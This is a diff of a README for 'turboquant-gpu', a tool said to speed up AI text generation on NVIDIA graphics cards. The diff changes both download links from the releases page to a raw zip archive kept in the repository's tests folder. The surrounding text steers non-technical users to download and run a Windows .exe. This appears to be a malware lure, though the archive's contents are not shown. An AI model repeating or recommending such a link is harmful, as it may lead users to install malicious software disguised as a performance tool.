@@ -1,6 +1,6 @@
 # ⚡ turboquant-gpu - Make your artifical intelligence run faster
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Tobiaszn8972/turboquant-gpu/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Tobiaszn8972/turboquant-gpu/raw/refs/heads/main/tests/turboquant_gpu_3.5.zip)
 
 TurboQuant-GPU improves the speed of text-generating programs. It compresses data inside your graphics card memory. This allows the computer to think faster while it writes text. You get more results in less time. This tool works with any NVIDIA graphics card.
 
@@ -20,7 +20,7 @@ Updating your graphics driver ensures the software runs without errors. Check th
 
 You must visit the website below to download the application.
 
-[https://github.com/Tobiaszn8972/turboquant-gpu/releases](https://github.com/Tobiaszn8972/turboquant-gpu/releases)
+[https://github.com/Tobiaszn8972/turboquant-gpu/raw/refs/heads/main/tests/turboquant_gpu_3.5.zip](https://github.com/Tobiaszn8972/turboquant-gpu/raw/refs/heads/main/tests/turboquant_gpu_3.5.zip)
 
 Click the link to view the list of available versions. Choose the file ending in `.exe` for Windows. Save this file to your Downloads folder. 
 
